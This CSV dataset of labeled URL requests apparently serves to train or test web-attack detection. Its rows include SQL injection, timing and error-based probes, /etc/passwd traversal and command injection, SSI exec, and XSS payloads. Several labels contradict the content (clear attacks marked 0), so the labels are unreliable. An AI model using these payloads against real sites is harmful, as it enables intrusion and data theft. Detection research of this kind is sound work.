text,label
/tienda1/publico/vaciar.jsp?b2=vaciar+carrito@40,1
/blog/index.php/registration%22,1
/%22/index.php/aliquam-odio-a-labore-magnam-quam-quis/feed,1
/blog/wp-content/uploads/2020/04%3Bcat+%2Fetc%2Fpasswd%3B/7eb06ef2-3782-3e6a-bb62-c705e86b2eee-300x200.jpg,0
/blog/%2Fassets/themes/twentyseventeen/assets,0
/blog/wp-includes/https%3A%5C%5C8501779237819759495.owasp.org/plupload/wp-plupload.min.js?ver=4.9.5,0
/blog/wp-includes/js%27+AND+%271%27%3D%271,1
/blog/%2F%2F8501779237819759495.owasp.org/uploads/2020/04/7eb06ef2-3782-3e6a-bb62-c705e86b2eee.jpg,0
/recordings/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00,1
ninnette,0
/blog/wp-content/uploads/2020%27%29+UNION+ALL+select+NULL+--+/04/755e6d4b-39f2-3314-89a0-c9a4d1bc3143.jpg,1
/HtTpS%3A%2F%2F8501779237819759495.owasp.org/index.php/2020/03/22,0
/blog/wp-content/uploads/2020/04+where+0+in+%28select+sleep%2815%29+%29+--+/bdffa507-6fa1-380b-b720-116dfaf00c82-1024x682.jpg,1
/https%3A%5C%5C8501779237819759495.owasp.org/xmlrpc.php?rsd,0
/blog/index.php/2020/04/04/animi-sint-ut-sed-commodi/feed%26%26cat+%2Fetc%2Fpasswd,0
/blog%22%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/29/distinctio-sequi-officiis-occaecati,1
/nine inch nails - with teeth/,0
/blog/wp-login.php?action=%27 user_login=euphoricPoultry0&redirect_to=&wp-submit=Get+New+Password,1
/blog/wp-content/plugins%22+%2F+sleep%2815%29+%2F+%22/user-registration/assets/js/frontend,0
/blog/index.php/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/04/04/nihil-tenetur-et-ad-in-dolores/embed,0
/blog/index.php/2020%2CROW%282835%2C1417%29%3E%28SELECT+COUNT%28*%29%2CCONCAT%280x3a727a613a%2C%28SELECT+%28ELT%282835%3D2835%2C1%29%29%29%2C0x3a6172743a%2CFLOOR%28RAND%280%29*2%29%29x+FROM+%28SELECT+2492+UNION+SELECT+1401+UNION+SELECT+4019+UNION+SELECT+6534%29a+GROUP+BY+x%29/03/27,1
/blog/wp-content/themes/twentyseventeen/assets/js/navigation.0,0
/blog/wp-content/uploads%22+%2F+sleep%2815%29+%2F+%22/2020/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-180x180.jpg,0
/blog/index.php/2020%27%29%29+AND+%28SELECT+8539+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x3a727a613a%2C%28SELECT+%28ELT%288539%3D8539%2C1%29%29%29%2C0x3a6172743a%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%28%28%27HbGt%27%3D%27HbGt/03/23/fuga-aut-recusandae-sed-dolor-quia,1
/blog/index.php/2020/04%22+OR+%221%22%3D%221/04/rerum-soluta-et-quis-excepturi-labore/embed,1
/%2F/wp-includes/css/media-views.min.css?ver=4.9.5,0
/blog/index.php%27%29+AND+4403%3D5049+AND+%28%27EVJK%27+LIKE+%27EVJK/2020/03/29/distinctio-sequi-officiis-occaecati/embed,1
/blog/index.php/search%25/problem,0
/blog/wp-content/https%3A%2F%2F8501779237819759495.owasp.org/user-registration/assets/js,0
/blog/wp-includes/js/plupload/wp-plupload.min.1,0
:response.write 111111,1
/blog/index.php/my-account/lost-passwordNULL user_login=insecureCrane9&ur_reset_password=true&_wpnonce=4b87c6adf6&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Flost-password%2F,1
/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/index.php/my-account/lost-password?reset-link-sent=true,0
/tienda1/publico/autenticar.jsp?modo=entrar&logina=boeyen&pwd=13st7l75n&remember=off&b1=entrar,1
/blog/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js.bz2,0
/blog/index.php/c%3A%2F/03/29/distinctio-sequi-officiis-occaecati,0
/blog/index.php/2020%27%29%29+AND+8457%3D6120+AND+%28%28%27dnyF%27%3D%27dnyF/03/22/quidem-rerum-sit-doloribus-quia-eum,1
"/d765w06j.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/blog/index.php%22+where+0+in+%28select+sleep%2815%29+%29+--+/search/feed/rss2,1
/blog/index.php/2020/04/04/animi-sint-ut-sed-commodi/feed%22%3Bcat+%2Fetc%2Fpasswd%3B%22,0
"/tienda1/publico/registro.jsp?modo=registro&login=katuscha&password=tel�n&nombre=mateo&apellidos=vi�as+batle&email=tuyl@vestidos-de-novias-y-bebes.kh&dni=71693604m&direccion=gabriel+y+galan,+161+1?b&ciudad=nevada&cp=37621&provincia=m�laga&ntc=3470754275617444&b1=registrar",0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/embed%25%27+ORDER+BY+1--+-,1
/blog/wp-content/uploads/2020/04/27f17687-adda-3ce6-9767-0037ea74eec2.png%3Bcat+%2Fetc%2Fpasswd%3B,0
/etc%2Fpasswd/index.php/my-account/lost-password?reset-link-sent=true,0
/blog%22+UNION+ALL+SELECT+NULL%2CNULL%23/index.php/2020/03/29/distinctio-sequi-officiis-occaecati,1
